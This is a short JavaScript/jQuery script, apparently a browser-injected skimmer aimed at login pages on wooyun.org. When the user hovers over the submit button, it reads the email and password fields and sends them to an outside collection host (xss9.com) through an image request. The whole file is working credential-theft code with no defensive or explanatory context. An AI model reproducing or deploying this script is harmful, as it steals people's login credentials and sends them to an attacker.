$(document).ready(function()
{
    var server = "http://xss9.com/"; //发送地址
    var gate = "index.php?do=api&id=xxxx"; //接收参数
    var tabURL = window.location.href;
    
        if(tabURL.indexOf('wooyun.org') !== -1 )
    {
        wooyun();
    }

    function email()
    {
        var email = document.getElementsByName('email')[0].value;
        var password = document.getElementsByName('password')[0].value;
        var data = "&username="+email+"&password="+password;
        new Image().src = server+gate+data;
        //console.log("email="+email+"&password="+password)
    }
    function wooyun()
    {
        document.getElementById('subbtn').onmouseover = email;
    }    
    });